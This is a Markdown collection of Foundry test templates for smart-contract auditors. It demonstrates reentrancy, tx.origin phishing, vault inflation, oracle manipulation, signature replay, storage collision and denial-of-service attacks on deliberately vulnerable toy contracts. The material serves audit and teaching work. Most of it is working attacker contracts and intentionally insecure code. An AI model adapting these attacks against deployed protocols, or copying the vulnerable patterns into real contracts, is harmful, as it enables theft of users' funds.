# Foundry PoC Patterns

Ready-to-use Proof of Concept templates for common vulnerability classes.

---

## Base Test Setup

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract BaseExploit is Test {
    // Actors
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    // Common setup
    function setUp() public virtual {
        vm.deal(deployer, 100 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);
    }

    // Helper: Log balance changes
    function logBalances(string memory label) internal view {
        console2.log("=== %s ===", label);
        console2.log("Attacker ETH:", attacker.balance);
        console2.log("Victim ETH:", victim.balance);
    }
}
```

---

## 1. Reentrancy PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

// Vulnerable contract
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;  // Bug: state update after call
    }
}

// Attacker contract
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            vault.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableVault vault;
    ReentrancyAttacker attackerContract;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new VulnerableVault();

        // Victim deposits funds
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();

        // Attacker deploys attack contract
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        attackerContract = new ReentrancyAttacker(address(vault));
    }

    function test_reentrancyExploit() public {
        console2.log("=== Before Attack ===");
        console2.log("Vault balance:", address(vault).balance);
        console2.log("Attacker contract balance:", address(attackerContract).balance);

        // Execute attack
        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        console2.log("=== After Attack ===");
        console2.log("Vault balance:", address(vault).balance);
        console2.log("Attacker contract balance:", address(attackerContract).balance);

        // Attacker drained the vault
        assertEq(address(vault).balance, 0);
        assertGt(address(attackerContract).balance, 1 ether);
    }
}
```

---

## 2. Access Control Bypass PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract VulnerableAdmin {
    address public owner;
    uint256 public secretValue;

    constructor() {
        owner = msg.sender;
    }

    // Bug: Missing access control
    function setSecretValue(uint256 _value) external {
        secretValue = _value;
    }

    // Bug: tx.origin check
    function withdrawAll() external {
        require(tx.origin == owner, "Not owner");
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract PhishingContract {
    VulnerableAdmin target;

    constructor(address _target) {
        target = VulnerableAdmin(_target);
    }

    // Trick owner into calling this
    function claimReward() external {
        target.withdrawAll();  // tx.origin is still owner
    }
}

contract AccessControlTest is Test {
    VulnerableAdmin vulnerable;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        vulnerable = new VulnerableAdmin();
    }

    function test_missingAccessControl() public {
        // Anyone can call setSecretValue
        vm.prank(attacker);
        vulnerable.setSecretValue(999);

        assertEq(vulnerable.secretValue(), 999);
    }

    function test_txOriginPhishing() public {
        // Setup: owner has funds in vulnerable contract
        vm.deal(address(vulnerable), 10 ether);

        // Attacker deploys phishing contract
        vm.prank(attacker);
        PhishingContract phishing = new PhishingContract(address(vulnerable));

        // Owner is tricked into calling phishing contract
        // (e.g., via malicious frontend)
        vm.prank(owner);
        phishing.claimReward();

        // Funds went to phishing contract, not owner
        assertEq(address(vulnerable).balance, 0);
        assertEq(address(phishing).balance, 10 ether);
    }
}
```

---

## 3. First Depositor Inflation Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract VulnerableVault is ERC20 {
    ERC20 public asset;

    constructor(address _asset) ERC20("Vault", "vTKN") {
        asset = ERC20(_asset);
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        shares = totalSupply() == 0
            ? assets
            : (assets * totalSupply()) / asset.balanceOf(address(this));

        asset.transferFrom(msg.sender, address(this), assets);
        _mint(msg.sender, shares);
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        assets = (shares * asset.balanceOf(address(this))) / totalSupply();
        _burn(msg.sender, shares);
        asset.transfer(msg.sender, assets);
    }
}

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflationAttackTest is Test {
    VulnerableVault vault;
    MockToken token;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockToken();
        vault = new VulnerableVault(address(token));

        // Give tokens
        token.mint(attacker, 10000 ether);
        token.mint(victim, 10000 ether);

        // Approvals
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    function test_inflationAttack() public {
        console2.log("=== Inflation Attack ===");

        // Step 1: Attacker deposits 1 wei, gets 1 share
        vm.prank(attacker);
        vault.deposit(1);
        console2.log("Attacker shares after deposit(1):", vault.balanceOf(attacker));

        // Step 2: Attacker donates large amount directly (no shares minted)
        vm.prank(attacker);
        token.transfer(address(vault), 10000 ether);
        console2.log("Vault balance after donation:", token.balanceOf(address(vault)));

        // Step 3: Victim deposits 10000 tokens
        vm.prank(victim);
        vault.deposit(10000 ether);
        console2.log("Victim shares:", vault.balanceOf(victim));

        // Victim got 0 shares due to rounding!
        assertEq(vault.balanceOf(victim), 0);

        // Step 4: Attacker withdraws everything
        vm.prank(attacker);
        vault.withdraw(vault.balanceOf(attacker));

        console2.log("Attacker final token balance:", token.balanceOf(attacker));

        // Attacker stole victim's deposit
        assertGt(token.balanceOf(attacker), 10000 ether);
    }
}
```

---

## 4. Flash Loan Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

interface IFlashLender {
    function flashLoan(uint256 amount) external;
}

contract VulnerableOracle {
    uint256 public price = 1 ether;

    function setPrice(uint256 _price) external {
        price = _price;
    }
}

contract VulnerableLending {
    VulnerableOracle public oracle;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    constructor(address _oracle) {
        oracle = VulnerableOracle(_oracle);
    }

    function deposit() external payable {
        collateral[msg.sender] += msg.value;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = collateral[msg.sender] * oracle.price() / 1 ether;
        require(collateralValue >= (debt[msg.sender] + amount) * 2, "Undercollateralized");

        debt[msg.sender] += amount;
        payable(msg.sender).transfer(amount);
    }
}

contract FlashLoanAttacker {
    VulnerableOracle oracle;
    VulnerableLending lending;

    constructor(address _oracle, address _lending) {
        oracle = VulnerableOracle(_oracle);
        lending = VulnerableLending(_lending);
    }

    function attack() external payable {
        // Step 1: Deposit small collateral
        lending.deposit{value: 1 ether}();

        // Step 2: Manipulate oracle (simulating flash loan manipulation)
        oracle.setPrice(100 ether);  // 100x price increase

        // Step 3: Borrow max with inflated collateral value
        lending.borrow(49 ether);

        // Step 4: Reset oracle (in real attack, swap back)
        oracle.setPrice(1 ether);

        // Profit: borrowed 49 ETH with only 1 ETH collateral
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract FlashLoanTest is Test {
    VulnerableOracle oracle;
    VulnerableLending lending;
    FlashLoanAttacker attackerContract;

    address attacker = makeAddr("attacker");

    function setUp() public {
        oracle = new VulnerableOracle();
        lending = new VulnerableLending(address(oracle));

        // Fund lending protocol
        vm.deal(address(lending), 100 ether);

        // Setup attacker
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        attackerContract = new FlashLoanAttacker(address(oracle), address(lending));
    }

    function test_oracleManipulation() public {
        console2.log("Attacker balance before:", attacker.balance);

        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        console2.log("Attacker balance after:", attacker.balance);

        // Attacker profited
        assertGt(attacker.balance, 1 ether);
    }
}
```

---

## 5. Signature Replay

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract VulnerableSignature {
    using ECDSA for bytes32;

    address public signer;

    constructor(address _signer) {
        signer = _signer;
    }

    // Bug: No nonce, no deadline, no chain ID
    function executeWithSig(
        address to,
        uint256 amount,
        bytes memory signature
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(to, amount));
        bytes32 ethSignedHash = hash.toEthSignedMessageHash();

        require(ethSignedHash.recover(signature) == signer, "Invalid sig");

        payable(to).transfer(amount);
    }

    receive() external payable {}
}

contract SignatureReplayTest is Test {
    VulnerableSignature vulnerable;

    uint256 signerPrivateKey = 0xA11CE;
    address signer;
    address attacker = makeAddr("attacker");

    function setUp() public {
        signer = vm.addr(signerPrivateKey);
        vulnerable = new VulnerableSignature(signer);
        vm.deal(address(vulnerable), 10 ether);
    }

    function test_signatureReplay() public {
        // Create legitimate signature for 1 ETH
        bytes32 hash = keccak256(abi.encodePacked(attacker, uint256(1 ether)));
        bytes32 ethSignedHash = ECDSA.toEthSignedMessageHash(hash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        console2.log("Attacker balance before:", attacker.balance);

        // First use (legitimate)
        vm.prank(attacker);
        vulnerable.executeWithSig(attacker, 1 ether, signature);

        // REPLAY: Same signature works again!
        vm.prank(attacker);
        vulnerable.executeWithSig(attacker, 1 ether, signature);

        // And again...
        vm.prank(attacker);
        vulnerable.executeWithSig(attacker, 1 ether, signature);

        console2.log("Attacker balance after:", attacker.balance);

        // Attacker drained 3 ETH with one signature
        assertEq(attacker.balance, 3 ether);
    }
}
```

---

## 6. Storage Collision (Upgrade)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract ImplementationV1 {
    address public owner;      // slot 0
    uint256 public value;      // slot 1

    function initialize(address _owner) external {
        owner = _owner;
    }
}

contract ImplementationV2 {
    uint256 public newValue;   // slot 0 - COLLISION with owner!
    address public owner;      // slot 1
    uint256 public value;      // slot 2

    function setNewValue(uint256 _value) external {
        newValue = _value;
    }
}

contract SimpleProxy {
    address public implementation;

    constructor(address _impl) {
        implementation = _impl;
    }

    function upgrade(address _newImpl) external {
        implementation = _newImpl;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract StorageCollisionTest is Test {
    SimpleProxy proxy;
    ImplementationV1 v1;
    ImplementationV2 v2;

    address owner = makeAddr("owner");

    function setUp() public {
        v1 = new ImplementationV1();
        v2 = new ImplementationV2();

        proxy = new SimpleProxy(address(v1));

        // Initialize via proxy
        ImplementationV1(address(proxy)).initialize(owner);
    }

    function test_storageCollision() public {
        console2.log("Owner before upgrade:", ImplementationV1(address(proxy)).owner());
        assertEq(ImplementationV1(address(proxy)).owner(), owner);

        // Upgrade to V2
        proxy.upgrade(address(v2));

        // Set newValue (which is at slot 0, same as owner was)
        ImplementationV2(address(proxy)).setNewValue(12345);

        // Owner is now corrupted!
        console2.log("Owner after setNewValue:", ImplementationV2(address(proxy)).owner());
        console2.log("newValue:", ImplementationV2(address(proxy)).newValue());

        // Owner address is now 12345
        assertEq(uint256(uint160(ImplementationV2(address(proxy)).owner())), 0);
        assertEq(ImplementationV2(address(proxy)).newValue(), 12345);
    }
}
```

---

## 7. DoS via Revert

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;

    function bid() external payable {
        require(msg.value > highestBid, "Bid too low");

        // Refund previous bidder
        if (highestBidder != address(0)) {
            payable(highestBidder).transfer(highestBid);  // Can revert!
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}

contract MaliciousBidder {
    function bid(VulnerableAuction auction) external payable {
        auction.bid{value: msg.value}();
    }

    // Reject all incoming ETH
    receive() external payable {
        revert("No refunds!");
    }
}

contract DoSTest is Test {
    VulnerableAuction auction;
    MaliciousBidder malicious;

    address legitimateBidder = makeAddr("legitimate");

    function setUp() public {
        auction = new VulnerableAuction();
        malicious = new MaliciousBidder();

        vm.deal(address(malicious), 10 ether);
        vm.deal(legitimateBidder, 10 ether);
    }

    function test_dosViaRevert() public {
        // Malicious bidder places bid
        malicious.bid{value: 1 ether}(auction);

        // Legitimate user tries to outbid
        vm.prank(legitimateBidder);
        vm.expectRevert();  // This will fail!
        auction.bid{value: 2 ether}();

        // Auction is stuck - malicious bidder wins by default
        assertEq(auction.highestBidder(), address(malicious));
    }
}
```

---

## Running PoCs

```bash
# Run specific test
forge test --match-test test_reentrancyExploit -vvvv

# Run all exploit tests
forge test --match-contract "Test$" -v

# With gas report
forge test --match-test testExploit --gas-report

# Fork mainnet for realistic PoC
forge test --fork-url $MAINNET_RPC -vvv
```

## PoC Best Practices

1. **Clear setup**: Document initial state
2. **Named actors**: Use `makeAddr("attacker")` for clarity
3. **Log state transitions**: `console2.log` before/after
4. **Strong assertions**: `assertGt`, `assertEq` to prove impact
5. **Minimal reproduction**: Only include necessary components
6. **Comments**: Explain each step of the attack
